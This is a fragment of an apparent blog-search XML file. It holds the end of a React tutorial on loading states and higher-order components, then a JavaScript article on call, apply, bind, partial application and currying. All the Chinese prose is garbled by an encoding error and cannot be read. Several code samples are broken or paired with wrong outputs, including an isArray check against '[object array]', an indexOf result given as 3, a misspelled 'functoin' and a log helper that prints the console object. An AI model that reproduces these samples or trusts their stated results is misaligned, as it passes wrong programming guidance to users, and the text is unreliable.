ä¸ºåˆ—è¡¨æ˜¯ç©ºçš„ï¼Œæ‰€ä»¥ä¸æ˜¾ç¤º Table ç»„ä»¶ã€‚å½“å“åº”æ•°æ®ä»Ž Hacker News API è¿”å›žæ—¶ï¼Œè¿”å›žçš„æ•°æ®ä¼šé€šè¿‡ Table ç»„ä»¶æ˜¾ç¤ºå‡ºæ¥ï¼ŒåŠ è½½çŠ¶æ€ (isLoading) è®¾ç½®ä¸º falseï¼Œç„¶åŽ Loading ç»„ä»¶æ¶ˆå¤±ã€‚åŒæ—¶ï¼Œå‡ºçŽ°äº†å¯ä»¥èŽ·å–æ›´å¤šçš„æ•°æ®çš„â€œMoreâ€æŒ‰é’®ã€‚ä¸€æ—¦ç‚¹å‡»æŒ‰é’®ï¼ŒèŽ·å–æ›´å¤šçš„æ•°æ®ï¼Œè¯¥æŒ‰é’®å°†æ¶ˆå¤±ï¼ŒåŠ è½½ç»„ä»¶ä¼šé‡æ–°å‡ºçŽ°ã€‚ é«˜é˜¶ç»„ä»¶é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰æ˜¯ React ä¸­çš„ä¸€ä¸ªé«˜çº§æ¦‚å¿µã€‚HOC ä¸Žé«˜é˜¶å‡½æ•°æ˜¯ç­‰ä»·çš„ã€‚å®ƒæŽ¥å—ä»»ä½•è¾“å…¥ - å¤šæ•°æ—¶å€™æ˜¯ä¸€ä¸ªç»„ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯å¯é€‰å‚æ•° - å¹¶è¿”å›žä¸€ä¸ªç»„ä»¶ä½œä¸ºè¾“å‡ºã€‚è¿”å›žçš„ç»„ä»¶æ˜¯è¾“å…¥ç»„ä»¶çš„å¢žå¼ºç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥åœ¨JSXä¸­ä½¿ç”¨ã€‚ HOCå¯ç”¨äºŽä¸åŒçš„æƒ…å†µï¼Œæ¯”å¦‚ï¼šå‡†å¤‡å±žæ€§ï¼Œç®¡ç†çŠ¶æ€æˆ–æ›´æ”¹ç»„ä»¶çš„è¡¨ç¤ºå½¢å¼ã€‚å…¶ä¸­ä¸€ç§æƒ…å†µæ˜¯å°† HOC ç”¨äºŽå¸®åŠ©å®žçŽ°æ¡ä»¶æ¸²æŸ“ã€‚æƒ³è±¡ä¸€ä¸‹çŽ°åœ¨æœ‰ä¸€ä¸ª List ç»„ä»¶ï¼Œç”±äºŽåˆ—è¡¨å¯ä»¥ä¸ºç©ºæˆ–æ— ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥æ¸²æŸ“ä¸€ä¸ªåˆ—è¡¨æˆ–è€…ä»€ä¹ˆä¹Ÿä¸æ¸²æŸ“ã€‚å½“æ²¡æœ‰åˆ—è¡¨çš„æ—¶å€™ï¼ŒHOC å¯ä»¥å±è”½æŽ‰è¿™ä¸ªä¸æ˜¾ç¤ºä»»ä½•å†…å®¹çš„åˆ—è¡¨ã€‚å¦ä¸€æ–¹é¢ï¼Œè¿™ä¸ªç®€å•çš„ List ç»„ä»¶ä¸å†éœ€è¦å…³å¿ƒåˆ—è¡¨å­˜ä¸å­˜åœ¨ï¼Œå®ƒåªå…³å¿ƒæ¸²æŸ“åˆ—è¡¨ã€‚ é«˜çº§æŽ’åºæˆ‘ä»¬å·²ç»å®žçŽ°äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯æœç´¢äº¤äº’ã€‚å› ä¸ºæˆ‘ä»¬å·²ç»æ‹¥äº† Table ç»„ä»¶ï¼Œæ‰€ä»¥å¢žå¼º Table ç»„ä»¶çš„äº¤äº’æ€§æ˜¯æœ‰æ„ä¹‰çš„ã€‚é‚£æŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸º Table ç»„ä»¶åŠ å…¥æ ¹æ®åˆ—æ ‡é¢˜è¿›è¡ŒæŽ’åºçš„åŠŸèƒ½å¦‚ä½•ï¼Ÿ ä½ è‡ªå·±å†™ä¸€ä¸ªæŽ’åºå‡½æ•°ï¼Œä½†æ˜¯ä¸€èˆ¬è¿™ç§æƒ…å†µï¼Œæˆ‘ä¸ªäººæ›´å–œæ¬¢ä½¿ç”¨ç¬¬ä¸‰æ–¹å·¥å…·åº“ã€‚lodashå°±æ˜¯è¿™äº›å·¥å…·åº“ä¹‹ä¸€ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥é€‰æ‹©é€‚ç”¨äºŽä½ çš„ä»»ä½•ç¬¬ä¸‰æ–¹åº“ã€‚è®©æˆ‘ä»¬å®‰è£… lodash å¹¶ä½¿ç”¨ã€‚ å‚è€ƒé“¾æŽ¥ï¼šhttps://leanpub.com/the-road-to-learn-react-chinese]]></content>
      <categories>
        <category>reactç›¸å…³</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[call/apply/bind çš„åŒºåˆ«]]></title>
    <url>%2F2018-06-23-call-apply-bind.html</url>
    <content type="text"><![CDATA[ä¸ºä»€ä¹ˆéœ€è¦ä½¿ç”¨ call/apply/bindä¸¾ä¸ªæ —å­ï¼š 123456box.onclick = function()&#123; function fn()&#123; alert(this); &#125; fn();&#125; ä¸Šä¾‹ä¸­çš„ this æŒ‡å‘æ˜¯ windowï¼Œè€Œä¸æ˜¯ box è§£å†³æ–¹æ³•ï¼š 1234567box.onclick = function()&#123; var self = this; function fn()&#123; alert(self); &#125; fn();&#125; é€šè¿‡æŠŠ this å®šä¹‰ç»™å˜é‡ self å°†å…¶ä¿å­˜ä¸‹æ¥ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬æƒ³è®©ä¼ªæ•°ç»„ä¹Ÿèƒ½å¤Ÿè°ƒç”¨æ•°ç»„çš„ä¸€äº›æ–¹æ³•ï¼Œè¿™æ—¶å€™ call/apply/bind å°±æ´¾ä¸Šç”¨åœºäº† 123456box.onclick = function()&#123; function fn()&#123; console.log(this); &#125; fn.call(this);&#125; call çš„ä½œç”¨å°±æ˜¯æ”¹å˜ this çš„æŒ‡å‘ï¼Œç¬¬ä¸€ä¸ªä¼ çš„å°±æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå°±æ˜¯æˆ‘ä»¬è¦å€Ÿç”¨çš„å¯¹è±¡ã€‚ fn.call(this) å°±æ˜¯è®© this åŽ»è°ƒç”¨ fn()ï¼Œè¿™é‡Œçš„ this å°±æ˜¯ box ä¸Šè¿°ä¾‹å­å¯ä»¥è¿›è¡Œç®€å†™ï¼šç®€å†™1 12345box.onclick = function()&#123; var fn = function()&#123; console.log(this); //box &#125;.call(this);&#125; ç®€å†™2 12345box.onclick = function()&#123; (function()&#123; console.log(this); //box &#125;.call(this));&#125; å¦ä¸€ç§å½¢å¼ 12345678var objName = &#123;name:'lbh'&#125;;var obj = &#123; name:'hello', sayHello:function()&#123; console.log(this.name); &#125;.bind(objName)&#125;;obj.sayHello(); //lbh ä¸‰è€…çš„å·®åˆ«call/apply/bind éƒ½æ˜¯ç”¨æ¥æ”¹å˜ this æŒ‡å‘çš„ï¼Œä½†ä¹Ÿæœ‰ä¸€äº›å°å°çš„å·®åˆ« 123456789101112131415161718function fn(a,b,c,d)&#123; console.log(a,b,c,d);&#125;//callfn.call(null,1,2,3);//applyfn.apply(null,[1,2,3]);//bindvar f = fn.bind(null,1,2,3);f(4);ç»“æžœå¦‚ä¸‹ï¼š1 2 3 undefined 1 2 3 undefined 1 2 3 4 ç¬¬ä¸€ä¸ªè¦ä¼ å…¥çš„å‚æ•°å°±æ˜¯è¦å€Ÿç”¨çš„å¯¹è±¡ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¸éœ€è¦å°±ç”¨äº† null ã€‚call å°±æ˜¯æŒ¨ä¸ªä¼ å€¼ï¼Œ apply æ˜¯ä¼ ä¸€ä¸ªæ•°ç»„ï¼Œ bind ä¹Ÿæ˜¯æŒ¨ä¸ªä¼ å€¼ï¼Œä½†æ˜¯å’Œ call ä¸Ž apply ä¸åŒï¼Œä½¿ç”¨ call å’Œ apply éƒ½ä¼šç›´æŽ¥æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œè€Œ bind å¹¶ä¸ç›´æŽ¥æ‰§è¡Œï¼Œè€Œæ˜¯å°†ç»‘å®šå¥½çš„ this é‡æ–°è¿”å›žä¸€ä¸ªæ–°å‡½æ•°ï¼Œä»€ä¹ˆæ—¶å€™è°ƒç”¨ç”±è‡ªå·±å†³å®š ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“ä½ å¸Œæœ›æ”¹å˜ä¸Šä¸‹æ–‡çŽ¯å¢ƒä¹‹åŽå¹¶éžé©¬ä¸Šæ‰§è¡Œçš„ï¼Œè€Œæ˜¯å›žè°ƒæ‰§è¡Œï¼Œå°±ä½¿ç”¨ bind æ–¹æ³•ï¼Œè€Œapply ä¸Ž call åˆ™ä¼šç«‹å³æ‰§è¡Œå‡½æ•°ã€‚ 12345678var objName = &#123;name:'lbh'&#125;;var obj = &#123; name:'hello', sayHello:function()&#123; console.log(this.name); &#125;.bind(objName);&#125;obj.sayHello(); //lbh ä¸Šè¿°ä¾‹å­ä¹‹æ‰€ä»¥ä½¿ç”¨ bind çš„åŽŸå› ä¹Ÿæ˜¯å› ä¸ºä½¿ç”¨ call ä¼šæŠ¥é”™ï¼ŒsayHello åœ¨ obj éƒ½å·²ç»æ‰§è¡Œå®Œäº†ï¼Œå°±æ ¹æœ¬ä¸ä¼šæœ‰ sayHello è¿™ä¸ªå‡½æ•° applyã€callå®žä¾‹æ•°ç»„ä¹‹é—´è¿½åŠ 1234var array1 = [12,'foo',&#123;name:'joe'&#125;,-2542]var array2 = ['Doe',123,100]Array.prototype.push.apply(array1, array2);// [12,'foo',&#123;name:'joe'&#125;,-2542,'Doe',123,100] èŽ·å–æ•°ç»„ä¸­çš„æœ€å¤§å€¼å’Œæœ€å°å€¼æ­£å¸¸æƒ…å†µä¸‹ç”¨ Math.max å¦‚ä¸‹ï¼š 1Math.max(10,6) ä¼ ä¸€ä¸ªæ•°ç»„å¯ä»¥ç”¨ apply12var arr = [1,2,40,32,5]; console.log(Math.max.apply(null,arr)); // 40 æ•°ç»„æœ¬èº«æ²¡æœ‰ max æ–¹æ³•ï¼Œä½†æ˜¯ Math æœ‰ï¼Œå¯ä»¥å€ŸåŠ© call æˆ–è€… apply ä½¿ç”¨å…¶æ–¹æ³•ã€‚ éªŒè¯æ˜¯å¦æ˜¯æ•°ç»„ï¼ˆå‰ææ˜¯ toString() æ–¹æ³•æ²¡æœ‰è¢«é‡å†™è¿‡ï¼‰123functionisArray(obj)&#123; return Object.prototype.toString.call(obj) === '[object array]'&#125; ä¼ªæ•°ç»„è°ƒç”¨æ•°ç»„123456var domNodes = Array.prototype.slice.call(document.getElementsByTagName('*'));function fn()&#123; [].push.call(arguments,3); console.log(arguments); //[1,2,3]&#125;fn(1,2); javaScript ä¸­å­˜åœ¨ä¸€ç§åä¸ºä¼ªæ•°ç»„çš„å¯¹è±¡ç»“æž„ï¼Œæ¯”è¾ƒç‰¹åˆ«çš„æ˜¯ arguments å¯¹è±¡ï¼Œè¿˜æœ‰åƒè°ƒç”¨ getElementByTagName ï¼Œdocument.childNodes ä¹‹ç±»çš„ï¼Œå®ƒä»¬è¿”å›žçš„ NodeList å¯¹è±¡éƒ½å±žäºŽä¼ªæ•°ç»„ã€‚ä¸èƒ½åº”ç”¨ Array ä¸‹çš„ push,popç­‰æ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ Array.prototype.slice.call è½¬æ¢ä¸ºçœŸæ­£çš„æ•°ç»„å¸¦æœ‰ length å±žæ€§çš„å¯¹è±¡ï¼Œè¿™æ · domNodes å°±å¯ä»¥åº”ç”¨ Array ä¸‹çš„æ‰€æœ‰æ–¹æ³•äº†ã€‚ å…¶ä»–çš„ï¼š 12var arr = ['abds'];console.log(''.indexOf.call(arr,'b')); //3 å®žé™…ä¸Šæµè§ˆå™¨çš„å†…éƒ¨å¹¶ä¸ä¼šåœ¨æ„ä½ æ˜¯è°ï¼Œè€Œæ˜¯å…³å¿ƒä½ ä¼ ç»™æˆ‘çš„æ˜¯ä¸æ˜¯æˆ‘èƒ½å¤Ÿè¿è¡Œçš„ é¢è¯•é¢˜å®šä¹‰ä¸€ä¸ª log æ–¹æ³•ï¼Œè®©å®ƒå¯ä»¥å¤„ç† console.log æ–¹æ³•ï¼Œå¸¸è§çš„è§£å†³æ–¹æ³•æ˜¯ï¼š 12345function log(msg)&#123; console.log(msg);&#125;log(1); // 1log(1,2) // 1 ä¸Šé¢çš„æ–¹æ³•å¯ä»¥è§£å†³åŸºæœ¬çš„ï¼Œä½†å½“ä¼ å…¥çš„å‚æ•°ä¸ç¡®å®šçš„æ—¶å€™ï¼Œä¸Šé¢çš„æ–¹æ³•å°±æ²¡æœ‰ç”¨äº†ã€‚è¿™ä¸ªæ—¶å€™å°±è¦è€ƒè™‘ä½¿ç”¨ apply æˆ–è€…æ˜¯ call ï¼Œå› ä¸ºä¼ å…¥çš„å‚æ•°ä¸ç¡®å®šï¼Œæœ€å¥½æ˜¯ç”¨æ•°ç»„çš„å½¢å¼æ¥ä¼ å‚ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨ applyã€‚ 12345function log()&#123; console.log.apply(console,arguments)&#125;log(1); // 1log(1,2) // 1,2 æŽ¥ä¸‹æ¥è¦ç»™æ¯ä¸€ä¸ª log æ¶ˆæ¯æ·»åŠ ä¸€ä¸ªå‰ç¼€â€œ(app)â€ï¼Œæ¯”å¦‚ï¼š 1log('hello world'); //(app)hello world è¿™ä¸ªæ—¶å€™å¯ä»¥æƒ³åˆ° arguments å‚æ•°æ˜¯ä¸€ä¸ªä¼ªæ•°ç»„ï¼Œé€šè¿‡ Array.prototype.slice.call è½¬ä¸ºæ ‡å‡†æ•°ç»„ï¼Œå†ä½¿ç”¨æ•°ç»„çš„æ–¹æ³•: 12345678910function log()&#123; // ä¼ ç»Ÿæ–¹æ³• Array.prototype.slice.call var args = Array.prototype.slice.call(arguments); // ES6 çš„ Array.from var args =Array.from(arguments); // ES6 çš„å±•å¼€å¼ var args =[...arguments]; args.unshift('(app)') console.log(console,args);&#125; å¯ä»¥çœ‹çœ‹ slice å†…éƒ¨çš„åŽŸç†ï¼š 1234567891011Array.prototype.slice = function(start,end)&#123; var result = new Array(); start = start || 0; // å¦‚æžœä¸ä¼ åˆ™è®¾ç½®é»˜è®¤å€¼ end = end || this.length; // å¦‚æžœä¸ä¼ åˆ™è®¾ç½®é»˜è®¤å€¼ // this æŒ‡å‘è°ƒç”¨çš„å¯¹è±¡ï¼Œå½“ç”¨äº†call ï¼Œèƒ½å¤Ÿæ”¹å˜ this çš„æŒ‡å‘ï¼Œä¹Ÿå°±æ˜¯ä¼ è¿›æ¥çš„å¯¹è±¡ï¼Œè¿™æ˜¯å…³é”® for(var i = start; i &lt; end; i++)&#123; result.push(this[i]); &#125; return result;&#125; bindè®²è§£bind ä¹‹å‰å…ˆçœ‹ä¸€é“é¢˜ç›® 12var altwrite = document.write;altwrite('hello'); ç»“æžœæ˜¯ï¼šUncaught TypeError:Illegal invacation altwrite() å‡½æ•°æ”¹å˜äº† this çš„æŒ‡å‘ global æˆ– window å¯¹è±¡ï¼Œå¯¼è‡´æ‰§è¡Œæç¤ºéžæ³•è°ƒç”¨å¼‚å¸¸ï¼Œæ­£ç¡®çš„æ–¹æ¡ˆå°±æ˜¯ä½¿ç”¨ bind æ–¹æ³• 1altwrite.bind(document)('hello') å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ call æ–¹æ³• 1altwrite.call(document,'hello') ç»‘å®šå‡½æ•°bind æœ€ç®€å•çš„å°±æ˜¯åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œä½¿å¾—æ•´ä¸ªå‡½æ•°ä¸è®ºæ€Žä¹ˆè°ƒç”¨éƒ½æœ‰åŒæ ·çš„ this å€¼ï¼Œå¸¸è§çš„é”™è¯¯å°±åƒä¸Šé¢çš„ä¾‹å­ä¸€æ ·ï¼Œå°†æ–¹æ³•ä»Žå¯¹è±¡ä¸­æ‹¿å‡ºæ¥ï¼Œç„¶åŽè°ƒç”¨ï¼Œå¹¶å¸Œæœ› this æŒ‡å‘åŽŸæ¥çš„å¯¹è±¡ã€‚å¦‚æžœä¸åšç‰¹æ®Šå¤„ç†ï¼Œä¸€èˆ¬ä¼šä¸¢å¤±åŽŸæ¥çš„å¯¹è±¡ï¼Œä½¿ç”¨bind æ–¹æ³•èƒ½å¤Ÿæ¼‚äº®çš„è§£å†³è¿™ä¸ªé—®é¢˜ï¼š 123456789101112this.num = 9;var myModule = &#123; num: 80, getNum: function()&#123; console.log(this.num); &#125;&#125;var getNum = myModule.getNum;getNum(); // 9 åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ this æŒ‡å‘å…¨å±€å˜é‡var getNum2 = getNum.bind(myModule);getNum2(); // 80 bind æ–¹æ³•ä¸Ž apply å’Œ call ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯å¯ä»¥æ”¹å˜å‡½æ•°å†…çš„ this çš„æŒ‡å‘ã€‚ MDN çš„è§£é‡Šæ˜¯ï¼šbind æ–¹æ³•ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œç§°ä¸ºç»‘å®šå‡½æ•°ï¼Œå½“è°ƒç”¨è¿™ä¸ªç»‘å®šå‡½æ•°çš„æ—¶å€™ï¼Œç»‘å®šå‡½æ•°ä¼šä»¥åˆ›å»ºå®ƒæ—¶ä¼ å…¥ bind æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸º this,ä¼ å…¥ bind æ–¹æ³•çš„ç¬¬äºŒä¸ªä»¥åŠä»¥åŽçš„å‚æ•°åŠ ä¸Šç»‘å®šå‡½æ•°è¿è¡Œæ—¶æœ¬èº«çš„å‚æ•°æŒ‰ç…§é¡ºåºä½œä¸ºåŽŸå‡½æ•°çš„å‚æ•°æ¥è°ƒç”¨åŽŸå‡½æ•°ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªå…·ä½“ä½¿ç”¨çš„ä¾‹å­ï¼š 123456789var foo = &#123; bar:1, eventBind: function()&#123; var _this = this; $('someClass').on('click',functoin(event)&#123; console.log(_this.bar); //1 &#125;); &#125;&#125; ç”±äºŽ JavaScript ç‰¹æœ‰çš„æœºåˆ¶ï¼Œä¸Šä¸‹æ–‡çŽ¯å¢ƒåœ¨ eventBind è¿™ä¸ªå‡½æ•°è¿‡æ¸¡åˆ° someClass çš„ç‚¹å‡»å‡½æ•°å‘ç”Ÿäº†å˜åŒ–ï¼Œä¸Šè¿°ä½¿ç”¨å˜é‡ä¿å­˜ this è¿™äº›æ–¹å¼éƒ½æ˜¯æœ‰ç”¨çš„ã€‚å½“ç„¶ä½¿ç”¨ bind å¯ä»¥æ›´åŠ ä¼˜é›…åœ°è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ 12345678var foo = &#123; bar:1, eventBind: function()&#123; $('someClass').on('click',functoin(event)&#123; console.log(this.bar); //1 &#125;.bind(this)); &#125;&#125; ä¸Šé¢çš„ä»£ç ä¸­ï¼Œbind åˆ›å»º äº†ä¸€ä¸ªå‡½æ•°ï¼Œå½“è¿™ä¸ª click äº‹ä»¶ç»‘å®šåœ¨è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œå®ƒçš„ this å…³é”®å­—ä¼šè¢«è®¾ç½®æˆä¼ å…¥çš„å€¼ï¼ˆè¿™é‡ŒæŒ‡çš„æ˜¯è°ƒç”¨ bind ä¼ å…¥çš„å‚æ•°ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¿™é‡Œæƒ³è¦ä¼ å…¥çš„ä¸Šä¸‹æ–‡ this (å…¶å®žå°±æ˜¯ foo)ï¼Œä½†bind å‡½æ•°ä¸­ã€‚ç„¶åŽå½“å›žè°ƒå‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œthis ä¾¿æŒ‡å‘ foo å¯¹è±¡ã€‚ å¦å¤–ä¸€ä¸ªä¾‹å­ï¼š 123456789var bar = function()&#123; console.log(this.x);&#125;var foo = &#123; x:3&#125;bar(); // undefinedvar func = bar.bind(foo);func(); // 3 è¿™é‡Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œå½“ä½¿ç”¨ bind åˆ›å»ºä¸€ä¸ªç»‘å®šå‡½æ•°ä¹‹åŽï¼Œå®ƒè¢«æ‰§è¡Œçš„æ—¶å€™ï¼Œå®ƒçš„ this ä¼šè¢«è®¾ç½®æˆ foo,è€Œä¸æ˜¯åƒæˆ‘ä»¬è°ƒç”¨ bar() æ—¶çš„å…¨å±€ä½œç”¨åŸŸã€‚ åå‡½æ•°ï¼ˆPartial Functionsï¼‰ä¸ŽæŸ¯é‡ŒåŒ–ï¼ˆCurryingï¼‰åå‡½æ•°å®šä¹‰ï¼š Partial application can be described as taking a function that accepts some number of arguments, binding values to one or more of those arguments, and returning a new function that only accepts the remaining, un-bound arguments. å¤§æ¦‚çš„æ„æ€å°±æ˜¯ï¼š åå‡½æ•°å¯ä»¥æè¿°ä¸ºæŽ¥å—ä¸€äº›å‚æ•°çš„å‡½æ•°ï¼Œå®ƒå°†å€¼ç»‘å®šåˆ°ä¸€ä¸ªæˆ–è€…å¤šä¸ªå‚æ•°ï¼Œè¿”å›žä¸€ä¸ªåªæŽ¥å—å…¶ä½™æœªç»‘å®šå‚æ•°çš„æ–°å‡½æ•°ã€‚ è¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ç‰¹æ€§ï¼Œä½¿ç”¨ bind æˆ‘ä»¬è®¾å®šå‡½æ•°çš„é¢„å®šä¹‰å‚æ•°ï¼Œç„¶åŽè°ƒç”¨çš„æ—¶å€™ä¼ å…¥å…¶ä»–å‚æ•°å°±å¯ä»¥äº†ã€‚ 1234567function list()&#123; return Array.prototype.slice.call(arguments);&#125;var list1 = list(1,2,3); //[1,2,3]var lending = list.bind(undefined,37); var list2 = lending(); //[37]var list3 = lending(1,2,3); // [37,1,2,3] ä¸Žä¹‹ç›¸ä¼¼çš„æœ‰ä¸€ä¸ªå«åšæŸ¯é‡ŒåŒ–çš„ æŸ¯é‡ŒåŒ–æŸ¯é‡ŒåŒ–æ˜¯æ˜¯æŠŠæŽ¥å—å¤šä¸ªå‚æ•°çš„å‡½æ•°å˜æ¢æˆæŽ¥å—ä¸€ä¸ªå•ä¸€å‚æ•°ï¼ˆæœ€åˆå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼‰çš„å‡½æ•°ï¼Œå¹¶ä¸”è¿”å›žæŽ¥å—ä½™ä¸‹çš„å‚æ•°ä¸”è¿”å›žç»“æžœçš„æ–°å‡½æ•°çš„æŠ€æœ¯ ä¸¤è€…çš„åŒºåˆ«ï¼š æŸ¯é‡ŒåŒ–æ˜¯å°†ä¸€ä¸ªå¤šå‚æ•°å‡½æ•°è½¬æ¢æˆå¤šä¸ªå•å‚æ•°å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å°†ä¸€ä¸ª n å…ƒå‡½æ•°è½¬æ¢æˆ n ä¸ªä¸€å…ƒå‡½æ•° åå‡½æ•°æ˜¯å›ºå®šä¸€ä¸ªå‡½æ•°çš„ä¸€ä¸ªæˆ–è€…å¤šä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯å°†ä¸€ä¸ª n å…ƒå‡½æ•°è½¬æ¢æˆ n - x å…ƒå‡½æ•°ã€‚ ä½¿ç”¨æ²¡æœ‰ä¸Šä¸‹æ–‡çš„åå‡½æ•°bind å¯ä»¥å®žçŽ°åå‡½æ•°ï¼Œä½†æ˜¯å¦‚æžœè¦å›ºå®šä¸€äº›å‚æ•°ï¼Œä½†æ˜¯ä¸ç»‘å®š this ? å†…ç½®çš„ bind ä¸å…è®¸è¿™æ ·ï¼Œæˆ‘ä»¬ä¸èƒ½å¿½ç•¥ä¸Šä¸‹æ–‡å¹¶è·³è½¬åˆ°å‚æ•°ï¼Œå¹¸è¿çš„æ˜¯ï¼Œå¯ä»¥ä»…ç»‘å®š partial å‡½æ•°å®¹æ˜“å®žçŽ°ï¼š 123456789101112131415function partial(func,...argsBound)&#123; return function(...args)&#123; return func.call(this,...argsBound,...args); &#125;&#125;let user = &#123; firstName:'John', say(time,phrase)&#123; console.log(`[$&#123;time&#125;] $&#123;this.firstName&#125;: $&#123;phrase&#125;!`); &#125;&#125;// åå‡½æ•°ï¼Œç»‘å®šç¬¬ä¸€ä¸ªå‚æ•°ï¼Œsay çš„ time user.sayNow = partial(user.say,new Date().getHours() + ':' + new Date().getMinutes());//è°ƒç”¨æ–°å‡½æ•°æä¾›çš„ç¬¬äºŒä¸ªå‚æ•° phraseuser.sayNow('Hello'); è°ƒç”¨ partical(func,[arg1,arg2â€¦])å‡½æ•°çš„ç»“æžœä¸ºè°ƒç”¨ func çš„åŒ…è£…å™¨ï¼ˆå³ç¬¬ä¸€ä¸ª return çš„å‡½æ•°ï¼‰ï¼š this ä¸€è‡´ï¼ˆå› ä¸º user.sayNow æ˜¯é€šè¿‡ user è°ƒç”¨çš„ï¼‰ ç„¶åŽç»™å…¶â€¦argsBound â€”â€”partical ä½¿ç”¨è¯¥å‚æ•°ï¼ˆâ€™æ—¶é—´â€˜ï¼‰è¿›è¡Œè°ƒç”¨ ç„¶åŽæä¾›å‚æ•°â€¦argsâ€”â€”æä¾›ç»™åŒ…è£…å™¨çš„å‚æ•°ï¼ˆâ€™Helloâ€˜ï¼‰ ä½¿ç”¨ spread è¿ç®—ç¬¦å¾ˆå®¹æ˜“å®žçŽ° æŸ¯é‡ŒåŒ–çš„å®žçŽ°æŸ¯é‡ŒåŒ–æ˜¯å¦ä¸€ç§æœ‰è¶£çš„å¤„ç†å‡½æ•°çš„æŠ€æœ¯ï¼šè½¬æ¢ä¸€ä¸ªè°ƒç”¨å‡½æ•°f(a,b,c)ä¸º f(a)(b)(c)çš„æ–¹å¼è°ƒç”¨ã€‚è®©æˆ‘ä»¬å®žçŽ°æŸ¯é‡ŒåŒ–å‡½æ•°ï¼Œæ‰§è¡Œä¸€ä¸ªä¸¤å…ƒå‚æ•°å‡½æ•°ï¼Œå³è½¬æ¢f(a,b)è‡³f(a)(b) 12345678910111213function curry(func)&#123; return function(a)&#123; return function(b)&#123; return func(a,b) &#125; &#125;&#125;function sum(a,b)&#123; return a + b;&#125;let carriedSum = curry(sum);console.log(carriedSum(1)(2)); ä¸Šé¢æ˜¯é€šè¿‡ä¸€ç³»åˆ—åŒ…è£…å™¨å®žçŽ°çš„ã€‚ curry(func)çš„ç»“æžœæ˜¯ function(a) çš„ä¸€ä¸ªåŒ…è£…å™¨ å½“è°ƒç”¨sum(1) ï¼Œå‚æ•°è¢«ä¿å­˜åœ¨è¯æ³•çŽ¯å¢ƒä¸­ï¼Œç„¶åŽè¿”å›žæ–°çš„åŒ…è£…å™¨funtion(b) ç„¶åŽ sum(1)(2)æä¾› 2 å¹¶æœ€ç»ˆè°ƒç”¨ function(b)ï¼Œç„¶åŽä¼ é€’è°ƒç”¨ç»™åŽŸå§‹å¤šå‚æ•°å‡½æ•° sum é«˜çº§æŸ¯é‡ŒåŒ–å®žçŽ°æœ‰ä¸€äº›æŸ¯é‡ŒåŒ–çš„é«˜çº§å®žçŽ°ï¼Œå¯ä»¥å®žçŽ°æ›´åŠ å¤æ‚çš„åŠŸèƒ½ï¼šå…¶è¿”å›žä¸€ä¸ªåŒ…è£…å™¨ï¼Œå®ƒå…è®¸å‡½æ•°æä¾›å…¨éƒ¨å‚æ•°è¢«æ­£å¸¸è°ƒç”¨ï¼Œæˆ–è¿”å›žåå‡½æ•°ï¼Œå®žçŽ°å¦‚ä¸‹ï¼š 123456789101112131415161718192021function curry(func)&#123; return function curried(...args)&#123; if(args.length &gt;= func.length)&#123; // å¦‚æžœå‚æ•°å¤§äºŽç­‰äºŽå‡½æ•°å‚æ•°ï¼Œé‚£ä¹ˆè¿è¡Œå‡½æ•°æä¾›å…¨éƒ¨å‚æ•°è¢«æ­£å¸¸è°ƒç”¨ return func.apply(this,args); &#125;else&#123; // æä¾›å‚æ•°å°äºŽå‡½æ•°å‚æ•°ï¼Œè¿”å›žåå‡½æ•° return function pass(...args2)&#123; return curried.apply(this,args.concat(args2)); &#125; &#125; &#125;&#125;function sum(a,b,c)&#123; return a + b + c;&#125;let curriedSum = curry(sum);// æä¾›å…¨éƒ¨å‚æ•°ï¼Œæ­£å¸¸è°ƒç”¨console.log(curriedSum(1,2,3));// è¿”å›žåå‡½æ•°åŒ…è£…å™¨ï¼Œå¹¶ä¸”æä¾›2,3å‚æ•°console.log(curriedSum(1,2)(3)); å½“æˆ‘ä»¬è¿è¡Œçš„æ—¶å€™ï¼Œæœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼š æä¾›å…¨éƒ¨å‚æ•°æ­£å¸¸è°ƒç”¨ï¼Œå¦‚æžœä¼ é€’ args æ•°ä¸ŽåŽŸæ¥çš„å‡½æ•°å®šä¹‰çš„å‚æ•°ä¸ªæ•°ä¸€æ ·æˆ–è€…æ›´é•¿ï¼Œç›´æŽ¥è°ƒç”¨ èŽ·å¾—åå‡½æ•°ï¼Œå¦åˆ™ï¼Œä¸è°ƒç”¨func 